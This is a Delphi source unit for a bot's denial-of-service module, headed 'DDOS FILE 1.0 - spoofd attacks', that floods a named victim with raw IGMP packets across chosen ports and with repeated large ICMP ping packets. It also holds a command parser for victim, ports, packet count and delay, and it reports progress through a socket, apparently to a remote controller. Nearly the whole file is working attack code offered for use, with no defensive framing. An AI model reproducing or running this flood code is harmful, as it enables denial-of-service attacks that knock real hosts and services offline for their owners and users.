unit ddos;
{
*****************************************************************
*
* DDOS FILE 1.0
* - spoofd attacks
* - Morpheus.
*
*****************************************************************
}
interface
uses
  Windows, SysUtils, Classes,winsock;

type
  TSunB = packed record
    s_b1, s_b2, s_b3, s_b4: byte;
  end;

  TSunW = packed record
    s_w1, s_w2: word;
  end;

  PIPAddr = ^TIPAddr;
  TIPAddr = record
    case integer of
      0: (S_un_b: TSunB);
      1: (S_un_w: TSunW);
      2: (S_addr: longword);
  end;

 IPAddr = TIPAddr;

TPorts = array of Word;

Flood_Type = Record
  Active:Boolean;
  Delay, Num, PacketSize, Sended: Cardinal;
  RandomSeek: Int64;
  Socket: TSocket;
  HedefAdres: TSockAddrIn;
  SrcPorts: TPorts;
  DstPorts: TPorts;
end;

procedure pingflood(host:String;Packets,size,delay:Integer);
Procedure PingHost(host:String;Packets:Integer);

function IcmpCreateFile : THandle; stdcall; external 'icmp.dll';
function IcmpCloseHandle (icmpHandle : THandle) : boolean; stdcall; external 'icmp.dll'
function IcmpSendEcho (IcmpHandle : THandle; DestinationAddress : IPAddr;
    RequestData : Pointer; RequestSize : Longint;
    RequestOptions : pointer;
    ReplyBuffer : Pointer;
    ReplySize : DWORD;
    Timeout : DWORD) : DWORD; stdcall; external 'icmp.dll';


function Ping(InetAddress : string) : boolean;
Function Analyze(Data:String;Var rs:Flood_Type):Boolean;
Function TranslateStringToTInAddr(AIP: string; var AInAddr):boolean;
Procedure StartIGMP(rs:Flood_Type);

Var
  Flood:Flood_Type;

implementation

uses
  stuff,erros;

type
 ip_option_information = record
  Ttl : byte;
  Tos : byte;
  Flags : byte;
  OptionsSize : byte;
  OptionsData : pointer;
end;

 ICMP_ECHO_REPLY =
 record
      Address : IPAddr;
      Status : ULONG;
      RoundTripTime : ULONG;
      DataSize : Word;
      Reserved : Word;
      Data : Pointer;
      Options : IP_OPTION_INFORMATION;
 end;

function ValidPort(const Port: string): Boolean; // function for checking a port
var
  prt: Integer;
begin
  prt := StrtoIntDef(Port, -1);
  Result := (prt > -1) and (prt < 65536); // a valid port must be between -1 and 65536
end;

function GetPorts(Ports: string): TPorts; // function for creating port array
  procedure AddPort(const Port: string);
  begin
    if ValidPort(Port) then
    begin
      SetLength(Result, Length(Result) + 1);
      Result[High(Result)] := StrtoInt(Port);
    end;
  end;
var
  i: Integer;
  S: string;
begin
  i := Pos(',', Ports);
  while i > 0 do // while ',' exists on ports string
  begin
    S := Copy(Ports, 1, i - 1); // copy until the position of ','
    AddPort(S); // and add it to port array
    Delete(Ports, 1, i); // delete until ',' (includes ',')
    i := Pos(',', Ports); // look for if there is another ','
  end;
  AddPort(Ports); // finally add the last port
end;

function GetRandomValue(const Range: Integer;Var rs:Flood_Type): Integer; // function for getting different random
begin                                                   // values between very short times
  Random;
  Inc(rs.RandomSeek);
  Result := (Random(High(Integer)) + rs.RandomSeek*$FFFF) mod Range;
end;

procedure SetParams(Const Data:String;Var rs:Flood_Type);
var
  i: integer;
  pstr: string;
  Ch: Char;
begin
  for i := 4 to StrCount(Data) do
  begin
    pstr := SpiltStr(data,i);
    Ch := #0;
    if Length(pstr) = 2 then
    begin
      if pstr[1] = '-' then
        Ch := pstr[2];
    end;
    case Ch of
      'e': Rs.PacketSize := StrtoIntDef(SpiltStr(Data,i + 1), 0);
      //'s': Rs.Num := StrtoIntDef(SpiltStr(Data,i + 1), 0);
      's': // parameter for source ports
        begin
          Rs.SrcPorts := GetPorts(SpiltStr(Data,i + 1));
          if Length(Rs.SrcPorts) = 0 then // if there is no src ports then exit
          begin
            Sendsock('[PACKET] (ERROR) No valid ports found on the src port list, randoming..');
          end;
      end;
      'd': Rs.Delay := StrtoIntDef(SpiltStr(Data,i + 1), 0);
    end;
  end;
end;

Function Analyze(Data:String;Var rs:Flood_Type):Boolean;
{ ***************
* Analyze Function 0.1 - Morpheus.
*
* Use: <Victim> <Ports> <Packets> | -s <SourcePorts> -d <Dealy> -e <ExtraData>
*
****************}
Begin
  FillChar(Rs, Sizeof(Rs), 0);
  Analyze:=False;
  if Rs.Active then
    sendsock('[ERROR] '+ER_007)
  else
    begin
    // first step (host)
    If StrCount(Data) >= 3 Then
      if Resolve(Pchar(SpiltStr(data,1)),rs.HedefAdres.sin_addr.S_addr) then
        begin
          Randomize;
          Rs.HedefAdres.sin_family := AF_INET;
          Rs.PacketSize := 5;
          Rs.Num := StrtoIntDef(SpiltStr(data,3),0);
          //Rs.HedefAdres.sin_port := htons(GetRandomValue(High(Word),rs) + 1);
          Rs.DstPorts := GetPorts(SpiltStr(Data,2));
          if Length(Rs.DstPorts) > 0 Then
            begin
              if StrCount(Data) > 3 Then
                SetParams(Data,Rs);
              Analyze:=True;
              Result:=True;
            end
          else
            sendsock('[ERROR] '+ER_009)
        end
      else
        sendsock('[ERROR] '+ER_005+ Pchar(SpiltStr(data,1)))
    else
      sendsock('[ERROR] '+ER_006)
    end;
End;

Function CreateSocket(Var rs:Flood_Type):Boolean;
begin
  Rs.Socket := Socket(AF_INET, SOCK_RAW, IPPROTO_IGMP);
  result:= Rs.Socket <> INVALID_SOCKET;
end;

function Gonder(s: TSocket; var Buf; len, flags: Integer; var addrto: TSockAddr;
  tolen: Integer): Integer; // function for sending packet and for checking send error
var
  LastError: Integer;
begin
  WSASetLastError(0);
  Result := Sendto(s, Buf, len, flags, addrto, tolen); // send packet
  LastError := WSAGetLastError;
  if LastError <> 0 then
    Sendsock('[ERROR]: ' + ER_008 + InttoStr(LastError));
end;


procedure SendBomba(Var rs:Flood_Type;dport: Word);
var
  Len: integer;
  Buf: PChar;
begin
  if dport = 0 then dport:= GetRandomValue(65535,rs) + 1;
  rs.HedefAdres.sin_port := dport;
  Len := 8 + Rs.PacketSize;
  GetMem(Buf, Len);
  try
    FillChar(Buf^, Len, 0);
    Gonder(Rs.Socket, Buf^, Len, 0, Rs.HedefAdres, Sizeof(Rs.HedefAdres));
  finally
    Freemem(Buf);
  end;
end;

Procedure StartIGMP;
var
  WSAData: TWSAData;
  UseDelay: Boolean;
  I:integer;
begin
  WSAStartUp($0101, WSAData);
  if CreateSocket(Rs) then
  try
    sendsock('[PACKET] (IGMP) Starting Attack on: ' + inet_ntoa(rs.HedefAdres.sin_addr) + ' On Port(s): ' + 'with p('+InttoStr(rs.num)+')d('+inttostr(rs.delay)+')e('+inttostr(rs.PacketSize)+').'); ;
    Rs.Active := True;
    UseDelay := Rs.Delay > 0;
    repeat
      for i := 0 to High(Rs.DstPorts) do
        begin
          SendBomba(rs,Rs.DstPorts[i]);
          Inc(rs.Sended);
          if UseDelay then
            Sleep(rs.Delay);
          if Rs.Sended = Rs.Num then break;
        end;
    until
      Rs.Sended >= Rs.Num;
  finally
    CloseSocket(Rs.Socket);
    WSACleanUp;
    sendsock('[PACKET] (IGMP) DONE.');
    // When i will do pointers, it will be here.
  end
  else
    sendsock('[ERROR]: '+ER_001);
  Rs.Active := False;
end;


function Fetch(var AInput: string; const ADelim: string = ' '; const ADelete: Boolean = true)
 : string;
var
  iPos: Integer;
begin
  if ADelim = #0 then begin
    // AnsiPos does not work with #0
    iPos := Pos(ADelim, AInput);
  end else begin
    iPos := Pos(ADelim, AInput);
  end;
  if iPos = 0 then begin
    Result := AInput;
    if ADelete then begin
      AInput := '';
    end;
  end else begin
    result := Copy(AInput, 1, iPos - 1);
    if ADelete then begin
      Delete(AInput, 1, iPos + Length(ADelim) - 1);
    end;
  end;
end;

Function TranslateStringToTInAddr;
var
  phe: PHostEnt;
  pac: PChar;
  GInitData: TWSAData;
begin
  result:=true;
  WSAStartup($101, GInitData);
  try
    phe := GetHostByName(PChar(AIP));
    if Assigned(phe) then
    begin
      pac := phe^.h_addr_list^;
      if Assigned(pac) then
      begin
        with TIPAddr(AInAddr).S_un_b do begin
          s_b1 := Byte(pac[0]);
          s_b2 := Byte(pac[1]);
          s_b3 := Byte(pac[2]);
          s_b4 := Byte(pac[3]);
        end;
      end
      else
      begin
        result:=false;
        Sendsock('[PING] Error getting IP from HostName.');
      end;
    end
    else
    begin
      result:=false;
      Sendsock('[PING] Error getting HostName.');
    end;
  except
    FillChar(AInAddr, SizeOf(AInAddr), #0);
  end;
  WSACleanup;
end;

function Ping(InetAddress : string) : boolean;
var
 Handle : THandle;
 InAddr : IPAddr;
 DW : DWORD;
 rep : array[1..128] of byte;
begin
  result := false;
  Handle := IcmpCreateFile;
  if Handle = INVALID_HANDLE_VALUE then
   Exit;
  TranslateStringToTInAddr(InetAddress, InAddr);
  DW := IcmpSendEcho(Handle, InAddr, nil, 0, nil, @rep, 128, 0);
  Result := (DW <> 0);
  IcmpCloseHandle(Handle);
end;

Procedure Pingflood;
var
 Handle : THandle;
 InAddr : IPAddr;
 DW     : DWORD;
 cnt    : integer;
 SAddr  : string;
 pnum   : integer;
 minTime: longint;
 maxTime: longint;
 allTime: longint;
 stat   : longint;
 PingBuf: array[0..31] of char;
 Reply  : ICMP_ECHO_REPLY;

begin
  if size > 12001 then size:=12001;

  //simple way:
  {
  if ping(host) then
    SENDSOCK('[PING] ONLINE: '+Host)
  else
    SENDSOCK('[PING] OFFLINE: '+Host);
  }
  //more compex way:
  Handle := IcmpCreateFile;
  if Handle = INVALID_HANDLE_VALUE then
   Halt(2);
  If TranslateStringToTInAddr(HOST, InAddr) then
  begin
  SAddr := Format('%d.%d.%d.%d',[InAddr.S_un_b.s_b1, InAddr.S_un_b.s_b2,
     InAddr.S_un_b.s_b3, InAddr.S_un_b.s_b4]);

  //writeln(Format ('Pinging %s [%s]',[ParamStr(1), SAddr]) );

  pnum := 0;
  minTime := MaxInt -1;
  maxTime := 0;
  AllTime := 0;

  Reply.Data := @pingBuf;
  Reply.DataSize := size;
  SendSock('[PACKET] (PING) Packeting: '+host+' With: '+inttostr(Packets)+' Packet(s) with size of: '+inttostr(size)+'MB(S) per: '+inttostr(delay)+'ms');
  for cnt := 1 to Packets do
   begin
     DW := IcmpSendEcho(Handle, InAddr, @PingBuf, size, nil, @reply, SizeOf(icmp_echo_reply) + size , 3000);
     if DW = 0 then
      //writeln('Request timed out')
        else
         begin
          //writeln(Format('Reply from %s: bytes = 32 time=%dms TTL=%d',[SAddr, Reply.RoundTripTime, Reply.Options.Ttl]));
          stat := Reply.RoundTripTime;
          inc(pnum);
          if minTime > stat then
            minTime := stat;
          if maxTime < stat then
            maxTime := stat;
          AllTime := AllTime + stat;
         end;
      Sleep(delay);
   end;
  SENDSOCK('[PACKET] (PING) Packet on: '+host+' ended.');  end;
  IcmpCloseHandle(Handle);
end;


Procedure PingHost;
var
 Handle : THandle;
 InAddr : IPAddr;
 DW     : DWORD;
 cnt    : integer;
 SAddr  : string;
 pnum   : integer;
 minTime: longint;
 maxTime: longint;
 allTime: longint;
 stat   : longint;
 PingBuf: array[0..31] of char;
 Reply  : ICMP_ECHO_REPLY;

begin

  //simple way:
  {
  if ping(host) then
    SENDSOCK('[PING] ONLINE: '+Host)
  else
    SENDSOCK('[PING] OFFLINE: '+Host);
  }
  //more compex way:
  Handle := IcmpCreateFile;
  if Handle = INVALID_HANDLE_VALUE then
   Halt(2);
  If TranslateStringToTInAddr(HOST, InAddr) then
  begin
  SAddr := Format('%d.%d.%d.%d',[InAddr.S_un_b.s_b1, InAddr.S_un_b.s_b2,
     InAddr.S_un_b.s_b3, InAddr.S_un_b.s_b4]);

  //writeln(Format ('Pinging %s [%s]',[ParamStr(1), SAddr]) );

  pnum := 0;
  minTime := MaxInt -1;
  maxTime := 0;
  AllTime := 0;

  Reply.Data := @pingBuf;
  Reply.DataSize := 32;

  for cnt := 1 to Packets do
   begin
     DW := IcmpSendEcho(Handle, InAddr, @PingBuf, 32, nil, @reply, SizeOf(icmp_echo_reply) + 32 , 3000);
     if DW = 0 then
      //writeln('Request timed out')
        else
         begin
          //writeln(Format('Reply from %s: bytes = 32 time=%dms TTL=%d',[SAddr, Reply.RoundTripTime, Reply.Options.Ttl]));
          stat := Reply.RoundTripTime;
          inc(pnum);
          if minTime > stat then
            minTime := stat;
          if maxTime < stat then
            maxTime := stat;
          AllTime := AllTime + stat;
         end;
      Sleep(500);
   end;
  SENDSOCK('[PING] '+SAddr+' S('+INTTOSTR(PACKETS)+') R('+INTTOSTR(pnum)+') L('+inttostr(packets-pnum)+') ['+inttostr(minTime)+'ms/'+inttostr(maxTime)+'ms]'+' ('+inttostr(round(AllTime / pnum))+'ms)');
  end;
  IcmpCloseHandle(Handle);
end;

// -------------------------------------
// This is not my floods, credit to: metinsdr@hotmail.com

Begin
  Flood.Active := False;
end.
